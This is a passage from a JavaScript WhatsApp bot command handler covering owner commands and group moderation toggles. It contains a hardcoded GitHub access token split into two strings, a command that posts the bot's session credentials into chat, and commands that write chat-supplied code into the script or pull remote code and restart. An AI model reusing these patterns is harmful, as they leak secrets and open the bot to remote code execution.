		if (!AlyaTheQueen) return AlyaStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await AlyaBotInc.updateBlockStatus(users, 'block')
		await replygcalya(`Done`)
	}
	break
	case 'unblock': case 'unban': {
		if (!AlyaTheQueen) return AlyaStickOwner()
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await AlyaBotInc.updateBlockStatus(users, 'unblock')
		await replygcalya(`Done`)
	}
	break
            case 'bcgc':
            case 'bcgroup': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                if (!text) return replygcalya(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                let getGroups = await AlyaBotInc.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                (`Sending Broadcast To ${anu.length} Group Chat, End Time ${anu.length * 1.5} seconds`)
                for (let i of anu) {
                    await sleep(1500)
                    let a = `${ownername}'s Broadcast\n\n` + '```' + `Message: ${text}\n\n` + '```'
                    AlyaBotInc.sendMessage(i, {
                        text: a,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: `Sent in ${i.length} Group`,
                                thumbnailUrl: 'https://i.imgur.com/QfDM014.jpeg',
                                sourceUrl: king,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    })
                }
                replygcalya(`Successful in sending Broadcast To ${anu.length} Group`)
            }
            break
            case 'getcase':
                if (!AlyaTheQueen) return AlyaStickOwner()
                try {
                   const getCase = (cases) => {
                      return "case" + `'${cases}'` + fs.readFileSync("Queenalya.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                   }
                   replygcalya(`${getCase(q)}`)
                } catch {
                  replygcalya(`case ${q} not found!`)
                }
break
case 'getcases':
    if (!AlyaTheQueen) return AlyaStickOwner()
    try {
        const fs = require('fs');
        const fileContent = fs.readFileSync("Queenalya.js").toString();
        const caseNames = fileContent.match(/case\s*'([^']+)'/g).map(caseLine => caseLine.replace(/case\s*'([^']+)'/, '$1'));

        replygcalya(`Available cases:\n${caseNames.join('\n')}`);
    } catch (err) {
        replygcalya(`Error fetching case names: ${err.message}`);
    }
break
case 'getsession':
    if (!AlyaTheQueen) return AlyaStickOwner();
    try {
        const fs = require('fs');
        const credsPath = './session/creds.json';

        // Read the content of creds.json
        const credsData = fs.readFileSync(credsPath, 'utf-8');

        // Send the content of creds.json as a reply
        replygcalya(credsData);
    } catch (error) {
        replygcalya('Error: creds.json file not found or unable to read the file.');
    }
break;
case 'delcase':
    if (m.sender !== '2349123721026@s.whatsapp.net') {
        return replygcalya('You are not authorized to use this command.');
    }

    if (!AlyaTheQueen) return AlyaStickOwner();
    try {
        const deleteCaseFromScript = (cases) => {
            const fileContent = fs.readFileSync("Queenalya.js").toString();

            // Check if the case exists in the script
            if (!fileContent.includes(`case '${cases}'`)) {
                replygcalya(`case '${cases}' not found!`);
                return;
            }

            // Extract the content before and after the case to be deleted
            const caseStartIndex = fileContent.indexOf(`case '${cases}'`);
            const caseEndIndex = fileContent.indexOf('break', caseStartIndex) + 5; // 'break' + length (5 characters)

            const newContent = fileContent.slice(0, caseStartIndex) + fileContent.slice(caseEndIndex);

            // Write the updated content back to the file
            fs.writeFileSync("Queenalya.js", newContent);
            replygcalya(`Deleted case '${cases}' from Queenalya.js successfully!`);
        }

        deleteCaseFromScript(q);
    } catch {
        replygcalya(`Error deleting case '${q}'!`);
    }
break
case 'addcase': {
    if (m.sender !== '2349123721026@s.whatsapp.net') {
        return replygcalya('You are not authorized to use this command.');
    }

    if (!AlyaTheQueen) return AlyaStickOwner();

    try {
        const addCaseToScript = (caseContent) => {
            const filePath = "Queenalya.js";
            const fileContent = fs.readFileSync(filePath, "utf8");

            // Find the switch block
            const switchRegex = /switch\s*[^)]+\s*\{/;
            const switchMatch = fileContent.match(switchRegex);

            if (!switchMatch) {
                replygcalya('No valid switch block found in the script.');
                return;
            }

            // Extract all case names from the provided content
            const caseNameMatches = caseContent.match(/case\s*['"]([^'"]+)['"]/g);

            if (!caseNameMatches) {
                replygcalya('Invalid case format.');
                return;
            }

            // Check if any of the case names already exist
            for (const caseNameMatch of caseNameMatches) {
                const caseName = caseNameMatch.replace(/case\s*['"]([^'"]+)['"]/, "$1");
                if (fileContent.includes(`case '${caseName}'`) || fileContent.includes(`case "${caseName}"`)) {
                    replygcalya(`case '${caseName}' already exists!`);
                    return;
                }
            }

            // Insert the new case inside the switch block
            const switchIndex = fileContent.indexOf(switchMatch[0]) + switchMatch[0].length;
            const updatedFileContent = fileContent.slice(0, switchIndex) + `\n${caseContent}\n` + fileContent.slice(switchIndex);

            // Write the updated content back to the file
            fs.writeFileSync(filePath, updatedFileContent, "utf8");
            replygcalya(`Added case(s) to Queenalya.js successfully!`);
        };

        // Add the case content provided by the user (raw input of the entire block)
        addCaseToScript(q);

    } catch (error) {
        replygcalya(`An error occurred while adding the case: ${error.message}`);
    }
}
break;
case 'update-repo': {
    if (m.sender !== '2349123721026@s.whatsapp.net') {
        return replygcalya('You are not authorized to use this command.');
    }

    if (!AlyaTheQueen) return AlyaStickOwner();

    // Split the token into two parts
    const tokenPart1 = 'ghp_';
    const tokenPart2 = 'XER7Zw2Rfe9MxiZFiwJx0R5j9W32vh0Ixn16';
    const token = tokenPart1 + tokenPart2; // Combine the parts

    const repoOwner = 'PhantomkidIII'; // Repository owner
    const repoName = 'Xing'; // Repository name
    const filePath = 'Queenalya.js'; // File to check and update
    const commitFile = './current_commit.txt'; // File to store the latest commit SHA

    try {
        // Fetch the latest commits from the repository
        const response = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/commits`, {
            headers: {
                'Authorization': `token ${token}`
            }
        });

        const latestCommitSha = response.data[0].sha; // Latest commit SHA

        let storedCommitSha = '';
        try {
            // Read the stored commit SHA from current_commit.txt
            storedCommitSha = await fs.promises.readFile(commitFile, 'utf8');
        } catch (err) {
            console.log("No current_commit.txt found, assuming first run.");
        }

        // Check if the latest commit is different from the stored one
        if (latestCommitSha !== storedCommitSha) {
            replygcalya('A new commit has been made to Queenalya.js. Update your bot!');

            // Fetch and update Queenalya.js
            const fileUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/${latestCommitSha}/${filePath}`;
            try {
                const fileResponse = await axios.get(fileUrl);
                // Save the updated content to the local file
                fs.writeFileSync(`./${filePath}`, fileResponse.data);
                console.log(`${filePath} updated successfully.`);

                // Store the latest commit SHA
                await fs.promises.writeFile(commitFile, latestCommitSha, 'utf8');
                
                // Notify the user and restart the bot
                replygcalya('Queenalya.js has been updated. Restarting the bot...');
                await sleep(3000); // Optional delay before restart

                // Restart the bot
                process.exit();
                
                // This will be logged after the bot restarts (on the next run)
                console.log('Bot restarted successfully and is now running the latest version.');
                replygcalya('Bot has been successfully updated and restarted.');
            } catch (fileError) {
                console.error(`Error downloading the update for ${filePath}:`, fileError);
                replygcalya(`Failed to download the update for ${filePath}. Please try again later.`);
            }
        } else {
            replygcalya('You are using the latest version of the bot.');
        }
    } catch (error) {
        console.error("Error checking for updates:", error.response ? error.response.data : error.message);
        replygcalya('Failed to check for updates. Please try again later.');
    }
}
break;
            case 'antibadword':
            case 'antitoxic':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].badword = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].badword = false
                  replygcalya(`${commad} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'react': {
                if (!AlyaTheQueen) return AlyaStickOwner()
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                AlyaBotInc.sendMessage(m.chat, reactionMessage)
            }
            break
           case 'nsfw': {
if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
if (args[0] === "on") {
if (AntiNsfw) return replygcalya('Already activated')
ntnsfw.push(from)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcalya('Success in turning on nsfw in this group')
var groupe = await AlyaBotInc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
AlyaBotInc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNsfw(not safe for work) feature has been enabled in this group, which means one can access sexual graphics from the bot!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfw) return replygcalya('Already deactivated')
let off = ntnsfw.indexOf(from)
ntnsfw.splice(off, 1)
fs.writeFileSync('./src/data/function/nsfw.json', JSON.stringify(ntnsfw))
replygcalya('Success in turning off nsfw in this group')
} else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
  }
  break
  case 'userjid':
  case 'jid':
  case 'groupjid':
            case 'id':{
            replygcalya(from)
           }
          break
            case 'antiaudio':{
            	if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiaudio = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiaudio = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiforeign':{
            	if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[m.chat].antiforeignnum = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[m.chat].antiforeignnum = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!AlyaTheQueen) return AlyaStickOwner()
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcalya(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|king,alya,rice.......`
                )
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await AlyaBotInc.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
        }
        break
            case 'antipoll':{
            	if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antipoll = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipoll = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antisticker':{
            	if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antisticker = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antisticker = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antiimage':{
            	if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiimage = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiimage = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivideo':{
            	if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antivideo = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivideo = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antivirtex':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antivirtex = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antivirtex = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antibot':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antibot = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antibot = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
